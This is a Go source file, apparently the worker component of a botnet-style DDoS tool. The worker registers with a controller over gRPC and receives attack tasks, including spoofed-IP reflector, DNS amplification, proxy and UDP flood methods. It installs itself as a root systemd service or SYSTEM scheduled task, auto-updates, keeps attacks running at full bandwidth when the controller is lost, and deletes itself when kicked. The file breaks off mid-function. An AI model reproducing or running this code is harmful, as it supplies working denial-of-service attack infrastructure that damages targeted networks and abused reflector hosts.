package worker

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"newtool/internal/attack"
	pb "newtool/internal/proto"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/keepalive"
	"google.golang.org/grpc/metadata"
)

// ctrlHTTPClient 用于所有向 controller 发起的 HTTP 请求（reflector 列表、
// proxy、DNS amp 域名）。必须带超时：这些请求部分处于攻击派发的同步路径上，
// 若 controller 的 HTTP 端点挂起而使用无超时的默认 client，Worker 会永久阻塞。
// TLS 模式必须跳过证书校验：Controller 默认使用自签证书，
// 默认校验会失败导致全部 HTTP 轮询不可用（与 gRPC 侧 InsecureSkipVerify 一致）。
var ctrlHTTPClient = &http.Client{
	Timeout: 10 * time.Second,
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
}

type Worker struct {
	id                   string
	assignedID           string
	controller           string
	httpPort             string
	authToken            string
	conn                 *grpc.ClientConn
	client               pb.NodeServiceClient
	tasksMu              sync.Mutex
	activeTasks          map[string]*attack.AttackSession
	activeComboTasks     map[string]*attack.ComboSession
	isWindows            bool
	canSpoofIP           bool
	proxySource          string
	maxBWMbps            int
	heartbeatFailStreak  int32
	lastHeartbeatLatency int64
	statsIntervalMs      int32
	// useTLS 为 true 表示 gRPC 连接使用了 TLS，HTTP 轮询也使用 https://。
	useTLS bool
	// degraded 为 1 表示因心跳失败正处于熔断降级状态。
	// 此期间 autoTuneThreads 不得改动全局带宽限速器，避免覆盖熔断降级设置。
	degraded int32

	reflectorCache     []string
	reflectorVersions  map[string]string // poolID → 服务端版本号，用于缓存失效判断
	reflectorLastFetch time.Time

	lastCPUPercent int32
	lastMemoryMB   int64
	activeThreads  int32

	// 本地反射器池
	localPool      *LocalReflectorPool
	workerLocation string
	useLocalPool   bool

	// 云更新：当前二进制版本标识（启动时计算一次）
	selfVersion string

	// autoTune 状态：autoTuneFactor=当前带宽因子（1.0=满速，仅降到刚好不超 CPU 上限）；
	// lowCPUCounter=低负载连续次数（回升时确认稳定用）
	autoTuneFactor float64
	lowCPUCounter  int

	// 熔断恢复状态（主循环单 goroutine 使用，无需锁）
	// recoveryStep: 0=未恢复, 1=50%, 2=75%, 3=100%；每档需连续 2 次成功心跳
	recoveryStep    int
	recoveryOkCount int
	// disconnectStart: 断连开始时刻；longDisconnect: 已进入长断连解限状态（>60s）
	disconnectStart time.Time
	longDisconnect  bool
}

// autoTune 参数：CPU 硬上限 90%；超出部分按比例降带宽（每超 1% 降 5%），
// 不再一刀切固定 80%，避免浪费性能。低负载（<60%）持续 45s 后每次回升 0.1。
const (
	autoTuneTargetCPU  = 90
	autoTuneRecoverCPU = 60
	autoTuneMinFactor  = 0.5
)

func New(id, controllerAddr, authToken, proxySource string, maxBWMbps int) *Worker {
	w := &Worker{
		id:                id,
		controller:        controllerAddr,
		httpPort:          "8080",
		authToken:         authToken,
		proxySource:       proxySource,
		maxBWMbps:         maxBWMbps,
		activeTasks:       make(map[string]*attack.AttackSession),
		activeComboTasks:  make(map[string]*attack.ComboSession),
		isWindows:         runtime.GOOS == "windows",
		canSpoofIP:        false,
		statsIntervalMs:   500,
		useLocalPool:      false,
		autoTuneFactor:    1.0,
		reflectorVersions: make(map[string]string),
		selfVersion:       computeSelfVersion(),
	}

	if maxBWMbps > 0 {
		maxBps := int64(maxBWMbps) * 125000
		attack.SetGlobalRateLimiter(0, maxBps)
		log.Printf("[bw] global bandwidth limit set: %d Mbps (%s Bps)", maxBWMbps, formatBps(maxBps))
	}

	return w
}

// SetHTTPPort 设置 Controller 的 HTTP 端口（dashboard/API），
// 未设置时默认 8080。仅当 Controller 使用非默认 HTTP 端口时需要。
func (w *Worker) SetHTTPPort(port string) {
	if port != "" {
		w.httpPort = port
	}
}

// EnableLocalPool 启用本地反射器池
func (w *Worker) EnableLocalPool(location string) error {
	w.workerLocation = location
	w.useLocalPool = true

	dbPath := "data/worker_local_pool.db"
	os.MkdirAll("data", 0755)

	pool, err := NewLocalReflectorPool(dbPath, location, "http://"+w.controller, w.authToken)
	if err != nil {
		return fmt.Errorf("init local pool: %w", err)
	}

	w.localPool = pool
	log.Printf("[worker] local pool enabled: location=%s", location)
	return nil
}

// controllerHost 提取 Controller 主机名（支持 [IPv6]:port 形式）
func (w *Worker) controllerHost() string {
	if host, _, err := net.SplitHostPort(w.controller); err == nil {
		return host
	}
	return w.controller
}

// ctrlBaseURL 返回 Controller 的 HTTP 基础 URL，自动选择 http/https
func (w *Worker) ctrlBaseURL() string {
	scheme := "http"
	if w.useTLS {
		scheme = "https"
	}
	return fmt.Sprintf("%s://%s:%s", scheme, w.controllerHost(), w.httpPort)
}

func IsRoot() bool {
	switch runtime.GOOS {
	case "windows":
		_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
		return err == nil
	default:
		return os.Geteuid() == 0
	}
}

func GetWANIP() (string, error) {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("https://api.ip.cc/")
	if err != nil {
		resp, err = client.Get("https://api.ipify.org")
		if err != nil {
			resp, err = client.Get("https://ifconfig.me/ip")
			if err != nil {
				return "", fmt.Errorf("failed to get WAN IP")
			}
		}
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2000))
	raw := strings.TrimSpace(string(body))

	var jsonResp struct {
		IP string `json:"ip"`
	}
	if err := json.Unmarshal([]byte(raw), &jsonResp); err == nil && jsonResp.IP != "" {
		return jsonResp.IP, nil
	}

	ip := strings.TrimSpace(raw)
	if ip == "" {
		return "", fmt.Errorf("empty IP response")
	}
	return ip, nil
}

func IsWindows() bool {
	return runtime.GOOS == "windows"
}

func InstallAutoStart(controllerAddr, token string) error {
	return InstallAutoStartHTTP(controllerAddr, token, "8080")
}

func InstallAutoStartHTTP(controllerAddr, token, httpPort string) error {
	exe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("get executable path: %w", err)
	}
	exe, _ = filepath.Abs(exe)

	switch runtime.GOOS {
	case "linux":
		service := fmt.Sprintf(`[Unit]
Description=NetTool Worker
After=network.target

[Service]
Type=simple
User=root
ExecStart=%s -c %s -token %s -http-port %s
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
`, exe, controllerAddr, token, httpPort)

		// 0600：systemd unit 内含 token，其他用户不应可读
		if err := os.WriteFile("/etc/systemd/system/nettool-worker.service", []byte(service), 0600); err != nil {
			return fmt.Errorf("write service file: %w (are you root?)", err)
		}

		exec.Command("systemctl", "daemon-reload").Run()
		exec.Command("systemctl", "enable", "nettool-worker").Run()
		// 安装后立即启动：否则 worker 进程在 -install 分支直接退出，
		// 服务处于 enabled 但 inactive 状态，节点不会上线
		if out, err := exec.Command("systemctl", "start", "nettool-worker").CombinedOutput(); err != nil {
			log.Printf("[install] systemctl start failed: %v (%s)", err, string(out))
		} else {
			log.Println("[install] systemd service started")
		}
		log.Println("[install] systemd service created and enabled")
		return nil

	case "windows":
		taskName := "NetToolWorker"
		cmd := fmt.Sprintf(
			`schtasks /create /tn "%s" /tr "\"%s\" -c %s -token %s -http-port %s" /sc onstart /ru SYSTEM /f`,
			taskName, exe, controllerAddr, token, httpPort,
		)
		output, err := exec.Command("cmd", "/c", cmd).CombinedOutput()
		if err != nil {
			return fmt.Errorf("schtasks failed: %s: %w", string(output), err)
		}
		// 安装后立即启动任务，节点立刻上线（开机自启依然生效）
		if out, err := exec.Command("cmd", "/c", `schtasks /run /tn "`+taskName+`"`).CombinedOutput(); err != nil {
			log.Printf("[install] schtasks /run failed: %v (%s)", err, string(out))
		} else {
			log.Println("[install] Windows scheduled task started")
		}
		log.Println("[install] Windows scheduled task created")
		return nil

	default:
		return fmt.Errorf("unsupported OS: %s", runtime.GOOS)
	}
}

func (w *Worker) Connect() error {
	// grpc.NewClient 是惰性连接（首次 RPC 时才建连），返回错误只代表参数非法，
	// 不能依赖它探测服务器是否支持 TLS。因此先主动做一次 TCP+TLS 握手探测，
	// 再据此选择传输凭证，否则无证书的 Controller 会让 Worker 永远连不上。
	tlsEnabled := probeControllerTLS(w.controller)

	keepaliveParams := grpc.WithKeepaliveParams(keepalive.ClientParameters{
		Time:                10 * time.Second,
		Timeout:             5 * time.Second,
		PermitWithoutStream: true,
	})

	var conn *grpc.ClientConn
	var err error
	if tlsEnabled {
		conn, err = grpc.NewClient(w.controller,
			grpc.WithTransportCredentials(credentials.NewTLS(&tls.Config{
				InsecureSkipVerify: true, // 允许自签名证书
			})),
			keepaliveParams,
		)
	} else {
		conn, err = grpc.NewClient(w.controller,
			grpc.WithTransportCredentials(insecure.NewCredentials()),
			keepaliveParams,
		)
	}
	if err != nil {
		return fmt.Errorf("connect: %w", err)
	}

	w.conn = conn
	w.client = pb.NewNodeServiceClient(conn)
	w.useTLS = tlsEnabled
	if tlsEnabled {
		log.Printf("[grpc] connected with TLS (probed)")
	} else {
		log.Printf("[grpc] connected without TLS (insecure, probed)")
	}
	return nil
}

// probeControllerTLS 探测控制器 gRPC 端口是否启用 TLS。
// 建连/握手失败一律视为明文（对明文服务器发起 TLS 握手必然失败），
// 保证默认无证书部署下 Worker 能正常回退。
func probeControllerTLS(addr string) bool {
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	host, _, err := net.SplitHostPort(addr)
	if err != nil {
		host = addr
	}

	tlsConn := tls.Client(conn, &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         host,
	})
	tlsConn.SetDeadline(time.Now().Add(5 * time.Second))
	if err := tlsConn.Handshake(); err != nil {
		return false
	}
	return true
}

func (w *Worker) Run(ctx context.Context) error {
	if !IsRoot() {
		log.Printf("[!] WARNING: not running as root/admin.")
		log.Printf("[!] IP spoofing unavailable. Network performance may be limited.")
	}
	if w.isWindows {
		log.Printf("[os] Windows detected - IP spoofing NOT available")
	} else {
		log.Printf("[os] Linux detected - IP spoofing available (requires root)")
	}

	autoBW := detectBandwidthMbps()
	if w.maxBWMbps > 0 {
		log.Printf("[bw] using configured limit: %d Mbps", w.maxBWMbps)
	} else if autoBW > 0 {
		w.maxBWMbps = autoBW
		maxBps := int64(autoBW) * 125000
		attack.SetGlobalRateLimiter(0, maxBps)
		log.Printf("[bw] auto-detected: %d Mbps, limit set to %d Mbps", autoBW, autoBW)
	} else {
		log.Printf("[bw] no bandwidth limit detected - running UNLIMITED")
		log.Printf("[bw] auto-tune disabled (CPU-based scaling requires bandwidth limit)")
	}

	// 反射器攻击必须伪造源 IP（否则放大响应打回 worker 自身，反射器毫无意义）。
	// 平台级预判：Windows / 非 root / 编译平台不支持 → 本地反射器池
	// 拉取与测试纯属浪费，直接跳过启动。
	platformSpoofOK := !w.isWindows && IsRoot() && attack.SupportsSpoofing()

	w.fetchProxy()

	// DNS 放大域名同样只用于反射攻击：平台级不支持伪造时跳过拉取
	if platformSpoofOK {
		w.fetchDNSAmp()
	}

	// 启动本地池（如果已启用）
	if w.useLocalPool && w.localPool != nil {
		if platformSpoofOK {
			w.localPool.UpdateControllerURL(w.ctrlBaseURL())
			if err := w.localPool.Start(); err != nil {
				log.Printf("[worker] local pool start failed: %v", err)
			}
			defer func() {
				if w.localPool != nil {
					w.localPool.Stop()
				}
			}()
		} else {
			log.Printf("[worker] local pool skipped: IP spoofing unavailable on this platform")
			log.Printf("[worker] reflector attacks will fallback to UDP")
			w.localPool = nil
			w.useLocalPool = false
		}
	}

	if err := w.register(); err != nil {
		return fmt.Errorf("register: %w", err)
	}
	defer w.deregister()

	// 探测 IP 伪造能力（在注册之后执行：probe 上报的 worker_id 用最终
	// assignedID，避免注册时 ID 冲突重分配导致 spoof 标签打到错误节点）
	// 顺序：Controller 缓存（按 IP 持久化，同 IP 重上线直接打标签）→
	// 本地 SQLite 缓存 → 真实探测
	if ctrlCached, found := w.queryControllerSpoofCache(); found {
		w.canSpoofIP = ctrlCached
		log.Printf("[spoof-probe] loaded controller cache: can_spoof=%v (IP-based, no probe needed)", ctrlCached)
	} else if w.localPool != nil {
		// 优先使用本地缓存（TTL: spoofCapabilityTTL）
		cached, testedAt, err := w.loadSpoofCapability()
		if err == nil && time.Since(testedAt) < spoofCapabilityTTL {
			w.canSpoofIP = cached
			log.Printf("[spoof-probe] loaded cached result: can_spoof=%v (tested %s ago)",
				cached, time.Since(testedAt).Round(time.Minute))
			// 缓存结果也上报（如 Controller 重启后节点状态被重置）
			w.reportSpoofStatus()
		} else {
			// 无缓存、过期或读取失败，执行探测
			log.Printf("[spoof-probe] no valid cache (err=%v), probing...", err)
			result, reliable := w.probeIPSpoofing()

			if reliable {
				// 探测完整执行：结果可信，落盘缓存
				w.canSpoofIP = result
				if err := w.saveSpoofCapability(result); err != nil {
					log.Printf("[spoof-probe] failed to save result: %v", err)
				}
				w.reportSpoofStatus()
			} else if err == nil {
				// 探测不可靠（网络抖动/Controller 不可达）但存在过期缓存：
				// 保守沿用旧值，避免一次抖动永久误关 IP 伪造
				w.canSpoofIP = cached
				log.Printf("[spoof-probe] probe unreliable, keeping cached value: can_spoof=%v", cached)
				w.reportSpoofStatus()
			} else {
				// 无任何历史数据，保守关闭
				w.canSpoofIP = false
				w.reportSpoofStatus()
			}
		}
	} else {
		// 未启用本地池：仅做内存探测，不落盘
		log.Printf("[spoof-probe] no local pool, probing in-memory...")
		w.canSpoofIP, _ = w.probeIPSpoofing()
		w.reportSpoofStatus()
	}

	// 探测最终确认：即使平台支持（root+Linux），实际网络环境仍可能
	// 禁止伪造（如 VPS/云主机）。此时反射器池依然毫无意义，停止本地池
	// 并清除引用，避免后续拉取/重测反射器白白消耗带宽与 CPU。
	if !w.canSpoofIP && w.localPool != nil {
		log.Printf("[worker] IP spoofing confirmed unavailable — stopping local reflector pool")
		w.localPool.Stop()
		w.localPool = nil
		w.useLocalPool = false
	}

	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	// 云更新检查：每 60s 轮询 Controller 目标版本，有新版本自动下载替换重启。
	// 延迟 10s 首次检查（让注册/配置先就绪），攻击中也能更新（下载走独立连接）。
	updateTicker := time.NewTicker(updateCheckEvery)
	defer updateTicker.Stop()
	updateTicker.Stop()
	updateTimer := time.NewTimer(10 * time.Second)
	defer updateTimer.Stop()

	// 攻击启动后延迟 30 秒再开始自动调优，让系统稳定
	autoTuneTicker := time.NewTicker(15 * time.Second)
	defer autoTuneTicker.Stop()
	autoTuneTicker.Stop() // 初始禁用
	autoTuneEnabled := false

	recoveryTicker := time.NewTicker(10 * time.Second)
	defer recoveryTicker.Stop()
	recoveryTicker.Stop()

	inRecovery := false
	startupStabilized := false
	startupTimer := time.NewTimer(30 * time.Second)
	defer startupTimer.Stop()

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-startupTimer.C:
			if !startupStabilized {
				startupStabilized = true
				if w.maxBWMbps > 0 {
					autoTuneTicker.Reset(15 * time.Second)
					autoTuneEnabled = true
					log.Printf("[autotune] startup stabilized, auto-tune enabled")
				}
			}
		case <-updateTimer.C:
			w.checkUpdate()
			updateTicker.Reset(updateCheckEvery)
		case <-updateTicker.C:
			w.checkUpdate()
		case <-autoTuneTicker.C:
			if autoTuneEnabled {
				w.autoTuneThreads()
			}
		case <-ticker.C:
			start := time.Now()
			err := w.heartbeat()
			latency := time.Since(start).Milliseconds()
			atomic.StoreInt64(&w.lastHeartbeatLatency, latency)

			if err != nil {
				fails := atomic.AddInt32(&w.heartbeatFailStreak, 1)
				log.Printf("[worker] heartbeat error (streak=%d): %v", fails, err)

				// 渐进恢复被打断：清零当前档的确认计数
				w.recoveryOkCount = 0

				// 攻击中：带宽被攻击流量打满是正常现象，心跳失败不代表
				// Controller 失联。此时绝不降带宽/停攻击——否则攻击刚开打
				// 就被熔断限到 0.1Mbps，看起来像"摸鱼"。
				if w.hasActiveTask() {
					if w.disconnectStart.IsZero() {
						w.disconnectStart = time.Now()
					}
					// 仍保留长断连解限：Controller 真失联 >60s 时让本地池全速
					if !w.longDisconnect && time.Since(w.disconnectStart) > 60*time.Second {
						w.longDisconnect = true
						w.recoveryStep = 0
						attack.SetGlobalRateLimiter(0, 0)
						log.Printf("[worker] controller unreachable > 60s during attack — lifting bandwidth limit (local pool attacks at full speed)")
					}
					continue // 攻击中不做熔断降级、不进入恢复流程
				}

				// 长断连检测：controller 失联超过 60s 后，保护控制通道的
				// 意义消失（带宽已被降级），解除限速让本地反射池全速攻击
				if w.disconnectStart.IsZero() {
					w.disconnectStart = time.Now()
				}
				if !w.longDisconnect && time.Since(w.disconnectStart) > 60*time.Second {
					w.longDisconnect = true
					w.recoveryStep = 0
					attack.SetGlobalRateLimiter(0, 0) // 不限流
					log.Printf("[worker] controller unreachable > 60s — lifting bandwidth limit (local pool attacks at full speed)")
				} else if !w.longDisconnect && w.isConnectionError(err) {
					w.handleHeartbeatFailure(int(fails))
				}

				if !inRecovery {
					inRecovery = true
					recoveryTicker.Reset(10 * time.Second)
				}
			} else {
				// 断连结束：清除长断连状态并直接回到满速（此前已全速攻击，无需渐进）
				w.disconnectStart = time.Time{}
				if w.longDisconnect {
					w.longDisconnect = false
					inRecovery = false
					recoveryTicker.Stop()
					atomic.StoreInt32(&w.degraded, 0)
					attack.SetGlobalRateLimiter(0, int64(w.maxBWMbps)*125000)
					log.Printf("[worker] controller reachable again after long disconnect, bandwidth at %d Mbps", w.maxBWMbps)
				}

				if atomic.LoadInt32(&w.heartbeatFailStreak) > 0 {
					log.Printf("[worker] heartbeat recovered after %d failures", atomic.LoadInt32(&w.heartbeatFailStreak))
				}
				atomic.StoreInt32(&w.heartbeatFailStreak, 0)

				if inRecovery {
					// 渐进恢复：每档连续 2 次成功心跳后升一档（50% → 75% → 100%），
					// 避免恢复瞬间流量突变
					w.recoveryOkCount++
					if w.recoveryOkCount >= 2 {
						w.recoveryOkCount = 0
						w.recoveryStep++
						w.applyRecoveryBandwidth()
						if w.recoveryStep >= 3 {
							inRecovery = false
							recoveryTicker.Stop()
							atomic.StoreInt32(&w.degraded, 0)
							log.Printf("[worker] connection fully restored, bandwidth at %d Mbps", w.maxBWMbps)
						}
					}
				}
			}
		case <-recoveryTicker.C:
			// 长断连解限后不再紧急停攻击（本地池在全力攻击，停掉反而浪费）
			// 攻击中绝不停止攻击：心跳失败是带宽占满的正常现象，
			// 停掉攻击会让整个节点在任务中"摸鱼"
			if inRecovery && !w.longDisconnect && !w.hasActiveTask() && atomic.LoadInt32(&w.heartbeatFailStreak) >= 3 {
				log.Printf("[worker] CRITICAL: 3+ heartbeat failures, stopping all attacks")
				w.stopAllAttacks()
			}
		}
	}
}

func (w *Worker) isConnectionError(err error) bool {
	msg := err.Error()
	return strings.Contains(msg, "Unavailable") ||
		strings.Contains(msg, "connection") ||
		strings.Contains(msg, "DeadlineExceeded")
}

// applyRecoveryBandwidth 按当前恢复档位设置带宽（50% → 75% → 100%）。
// 每档需连续 2 次成功心跳确认稳定后才升档，防止恢复瞬间流量突变。
func (w *Worker) applyRecoveryBandwidth() {
	switch w.recoveryStep {
	case 1:
		attack.SetGlobalRateLimiter(0, int64(float64(w.maxBWMbps)*125000*0.5))
		log.Printf("[worker] recovery step 1/3: bandwidth at 50%% (%d Mbps)", w.maxBWMbps/2)
	case 2:
		attack.SetGlobalRateLimiter(0, int64(float64(w.maxBWMbps)*125000*0.75))
		log.Printf("[worker] recovery step 2/3: bandwidth at 75%% (%d Mbps)", w.maxBWMbps*3/4)
	case 3:
		attack.SetGlobalRateLimiter(0, int64(w.maxBWMbps)*125000)
	}
}

func (w *Worker) handleHeartbeatFailure(fails int) {
	switch fails {
	case 1:
		log.Printf("[worker] heartbeat failure — monitoring")
	case 2:
		log.Printf("[worker] heartbeat failure x2 — halving bandwidth limit")
		atomic.StoreInt32(&w.degraded, 1)
		// 单位 bytes/s：maxBWMbps Mbps = maxBWMbps*125000 B/s，减半后至少保底 1 Mbps
		halfBps := max(int64(w.maxBWMbps)*62500, 125000)
		attack.SetGlobalRateLimiter(0, halfBps)
		log.Printf("[worker] bandwidth limit reduced to ~%d Mbps", halfBps/125000)
	case 3:
		atomic.StoreInt32(&w.degraded, 1)
		// 1 Mbps survival mode（125000 B/s）
		attack.SetGlobalRateLimiter(0, 125000)
		log.Printf("[worker] bandwidth limit reduced to 1 Mbps — survival mode")
	default:
		atomic.StoreInt32(&w.degraded, 1)
		// 0.1 Mbps（12500 B/s）
		attack.SetGlobalRateLimiter(0, 12500)
		log.Printf("[worker] TX nearly paused (0.1 Mbps)")
	}
}

func (w *Worker) hasActiveTask() bool {
	w.tasksMu.Lock()
	defer w.tasksMu.Unlock()
	return len(w.activeTasks) > 0 || len(w.activeComboTasks) > 0
}

func (w *Worker) stopAllAttacks() {
	w.tasksMu.Lock()
	tasks := w.activeTasks
	comboTasks := w.activeComboTasks
	w.activeTasks = make(map[string]*attack.AttackSession)
	w.activeComboTasks = make(map[string]*attack.ComboSession)
	w.tasksMu.Unlock()

	for id, s := range tasks {
		log.Printf("[worker] emergency stop: task %s", id)
		s.Stop()
	}
	for id, s := range comboTasks {
		log.Printf("[worker] emergency stop: combo task %s", id)
		s.Stop()
	}
	// 0.1 Mbps 应急限速，等待重连恢复
	attack.SetGlobalRateLimiter(0, 12500)
}

func (w *Worker) fetchProxy() {
	if w.proxySource == "none" || w.proxySource == "" {
		return
	}

	var data []byte
	var err error

	if w.proxySource == "controller" {
		controllerHTTP := w.ctrlBaseURL() + "/api/proxy"
		resp, httpErr := ctrlHTTPClient.Get(controllerHTTP)
		if httpErr != nil {
			log.Printf("[proxy] failed to fetch from controller: %v", httpErr)
			return
		}
		defer resp.Body.Close()
		data, err = io.ReadAll(resp.Body)
	} else {
		data, err = os.ReadFile(w.proxySource)
	}

	if err != nil {
		log.Printf("[proxy] failed: %v", err)
		return
	}

	n := attack.LoadProxiesFromData(data)
	if n > 0 {
		log.Printf("[proxy] loaded %d proxies", n)
	}
}

func (w *Worker) fetchDNSAmp() {
	url := w.ctrlBaseURL() + "/api/dnsamp"

	resp, err := ctrlHTTPClient.Get(url)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	var result struct {
		Domain  string   `json:"domain"`
		Domains []string `json:"domains"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return
	}
	if result.Domains != nil {
		// 显式同步（空列表=Controller 已清空，禁用 DNS 放大，不回退内置）
		attack.SetDomainsExplicit(result.Domains)
		log.Printf("[dns] loaded %d amp domains", len(result.Domains))
	}
	if result.Domain != "" {
		attack.SetAmpDomain(result.Domain)
		log.Printf("[dns] amp domain: %s", result.Domain)
	}
}

func (w *Worker) register() error {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	// 补传系统信息：CPU 核数/内存/带宽/地理位置，让 Controller 在注册时
	// 就能完整展示节点，无需等首个心跳（之前这些字段全为空）
	stats := collectSystemStats()
	resp, err := w.client.Register(ctx, &pb.RegisterRequest{
		WorkerId:      w.id,
		AuthToken:     w.authToken,
		IsWindows:     w.isWindows,
		Tags:          []string{"vse", "l4", "l7"},
		CpuCores:      int32(runtime.NumCPU()),
		MemoryMb:      stats.MemoryMB,
		BandwidthMbps: int32(w.maxBWMbps),
		Location:      w.workerLocation,
	})
	if err != nil {
		return err
	}
	if !resp.Success {
		return fmt.Errorf("registration rejected: %s", resp.Message)
	}

	if resp.AssignedId != "" && resp.AssignedId != w.id {
		log.Printf("[worker] ID reassigned: %s -> %s", w.id, resp.AssignedId)
		w.assignedID = resp.AssignedId
	} else {
		w.assignedID = w.id
	}

	log.Printf("[worker] registered as %s", w.assignedID)
	return nil
}

func (w *Worker) deregister() {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	w.client.Deregister(ctx, &pb.DeregisterRequest{
		WorkerId:  w.assignedID,
		AuthToken: w.authToken,
	})
	if w.conn != nil {
		w.conn.Close()
	}
}

func (w *Worker) heartbeat() error {
	stats := collectSystemStats()
	atomic.StoreInt32(&w.lastCPUPercent, stats.CPUPercent)
	atomic.StoreInt64(&w.lastMemoryMB, stats.MemoryMB)

	// 心跳超时：空闲 10s；攻击中放宽到 30s——带宽打满时 TCP 心跳包
	// 排队/重传可能远超 10s，短超时会让心跳持续失败。攻击中失败已
	// 不会降带宽/停攻击，这里进一步降低误判频率。
	hbTimeout := 10 * time.Second
	if w.hasActiveTask() {
		hbTimeout = 30 * time.Second
	}
	ctx, cancel := context.WithTimeout(context.Background(), hbTimeout)
	defer cancel()
	resp, err := w.client.Heartbeat(ctx, &pb.HeartbeatRequest{
		WorkerId:     w.assignedID,
		AuthToken:    w.authToken,
		CpuPercent:   float64(stats.CPUPercent),
		MemoryUsedMb: stats.MemoryMB,
	})
	if err != nil {
		// Controller 重启后节点表清空，心跳会返回 unknown node：
		// 自动重新注册自愈，否则 worker 会永久失联收不到新任务
		if strings.Contains(err.Error(), "unknown node") {
			if regErr := w.register(); regErr == nil {
				log.Printf("[worker] re-registered after unknown node: %s", w.assignedID)
			} else {
				// 注册被拒（如节点已被踢出）：不再无限重试，
				// 立即执行踢出流程（写标记 + 停服务 + 退出），防止复活
				log.Printf("[worker] re-register failed: %v", regErr)
				if strings.Contains(regErr.Error(), "kicked") {
					log.Printf("[worker] register rejected because node is kicked — self-exiting")
					w.kickSelf()
				}
			}
		}
		return err
	}

	if resp.Kick {
		// 被 Controller 踢出：停止所有攻击 → 注销 → 删除自身二进制 → 退出进程
		log.Printf("[worker] KICKED by controller, exiting and removing self")
		w.kickSelf()
	}

	if resp.CancelTaskId != "" {
		w.safeStopTask(resp.CancelTaskId)
	}

	if resp.PendingTask != nil {
		w.safeStartTask(resp.PendingTask)
	}

	return nil
}

// kickMarkerFile 踢出标记：存在则 worker 启动即退出（防 systemd 自动拉起复活）
const kickMarkerFile = "data/kicked"

// IsKicked 判断本机是否被踢出（存在 data/kicked 标记文件）
func IsKicked() bool {
	_, err := os.Stat(kickMarkerFile)
	return err == nil
}

// kickSelf 踢出处理：写踢出标记 → 停 systemd/计划任务 → 停止攻击 →
// deregister → 删除自身 → 退出
func (w *Worker) kickSelf() {
	// 1. 写踢出标记：即使 systemd 立刻重启，新进程也会检测到标记直接退出
	os.MkdirAll("data", 0755)
	if err := os.WriteFile(kickMarkerFile, []byte("kicked "+time.Now().Format(time.RFC3339)), 0644); err != nil {
		log.Printf("[worker] kick: failed to write marker: %v", err)
	} else {
		log.Printf("[worker] kick: marker written to %s", kickMarkerFile)
	}

	// 2. 尝试停止并禁用 systemd 服务 / Windows 计划任务（防自动重启）
	w.disableAutoRestart()

	// 3. 停止所有攻击 → 注销
	w.stopAllAttacks()
	w.deregister()

	// 4. 尝试删除自身二进制（Linux 可删除运行中的文件；失败仅记录）
	if exe, err := os.Executable(); err == nil {
		if err := os.Remove(exe); err != nil {
			log.Printf("[worker] kick: failed to remove self binary: %v", err)
		} else {
			log.Printf("[worker] kick: self binary removed")
		}
	}

	log.Printf("[worker] kick: bye")
	os.Exit(0)
}

// disableAutoRestart 停止并禁用 systemd 服务（Linux）/ Windows 计划任务，
// 防止 worker 退出后被自动拉起而复活。
func (w *Worker) disableAutoRestart() {
	if runtime.GOOS == "windows" {
		out, err := exec.Command("cmd", "/c", `schtasks /end /tn "NetToolWorker" && schtasks /delete /tn "NetToolWorker" /f`).CombinedOutput()
		if err != nil {
			log.Printf("[worker] kick: schtasks cleanup failed: %v (%s)", err, strings.TrimSpace(string(out)))
		} else {
			log.Printf("[worker] kick: scheduled task removed")
		}
		return
	}
	// Linux：stop + disable 服务，防止 Restart=always 拉起
	if out, err := exec.Command("systemctl", "stop", "nettool-worker").CombinedOutput(); err != nil {
		log.Printf("[worker] kick: systemctl stop failed (may not be a service): %v", err)
	} else {
		log.Printf("[worker] kick: systemd service stopped (%s)", strings.TrimSpace(string(out)))
	}
	if out, err := exec.Command("systemctl", "disable", "nettool-worker").CombinedOutput(); err != nil {
		log.Printf("[worker] kick: systemctl disable failed (may not be a service): %v", err)
	} else {
		log.Printf("[worker] kick: systemd service disabled (%s)", strings.TrimSpace(string(out)))
	}
}

// safeStopTask/safeStartTask 包一层 recover：任务参数来自 Controller，
// 任何意外 panic 都不能击穿心跳主循环导致整个 worker 崩溃。
func (w *Worker) safeStopTask(taskID string) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[worker] PANIC recovered in stopTask %s: %v", taskID, r)
		}
	}()
	w.stopTask(taskID)
}

func (w *Worker) safeStartTask(task *pb.AttackTask) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[worker] PANIC recovered in startTask %s: %v", task.TaskId, r)
		}
	}()
	w.startTask(task)
}

func (w *Worker) startTask(task *pb.AttackTask) {
	w.tasksMu.Lock()
	_, exists := w.activeTasks[task.TaskId]
	w.tasksMu.Unlock()
	if exists {
		return
	}

	method := task.Method
	// 兜底 1（controller 默认已开）：即使任务未开启 fallback，
	// 不支持伪造的 worker 执行反射器攻击也永远无法到达目标（响应打回自己），
	// 强制降级为普通 UDP 并告警
	if !w.canSpoofIP && isReflectorMethod(method) {
		if !task.FallbackToUdp {
			log.Printf("[worker] task %s: reflector %s but spoof unavailable & fallback off — FORCED fallback to udp_stdhex", task.TaskId, method)
		} else {
			log.Printf("[worker] task %s: reflector %s → fallback to UDP (spoof not available)", task.TaskId, method)
		}
		method = "udp_stdhex"
	}

	targets := parseTargets(task.Target)
	cfg := attack.AttackConfig{
		Target:       task.Target,
		Targets:      targets,
		Method:       method,
		Duration:     int(task.Duration),
		Threads:      int(task.Threads),
		PacketSize:   int(task.PacketSize),
